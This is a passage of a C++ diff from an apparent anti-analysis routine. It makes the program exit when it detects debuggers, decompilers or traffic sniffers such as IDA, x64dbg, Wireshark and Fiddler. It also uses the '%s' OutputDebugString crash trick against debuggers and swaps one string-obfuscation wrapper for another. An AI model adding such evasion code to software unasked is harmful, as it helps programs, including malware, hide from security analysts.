+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1324,7 +1324,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1342,7 +1342,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1360,7 +1360,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1378,7 +1378,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1396,7 +1396,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1414,7 +1414,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1432,7 +1432,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1450,7 +1450,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1468,7 +1468,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1486,7 +1486,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1504,7 +1504,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO IDA x32dbg detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO IDA x32dbg detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1522,7 +1522,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1541,7 +1541,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1560,7 +1560,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1579,7 +1579,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1598,7 +1598,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
         exit(0);
 
     }
@@ -1629,7 +1629,7 @@ int main()
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")); 
     }
     else
     {
@@ -1656,7 +1656,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Error && ECHO An error has ocured. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Error && ECHO An error has ocured. && TIMEOUT 10 >nul").c_str());
         exit(0);
     }
 
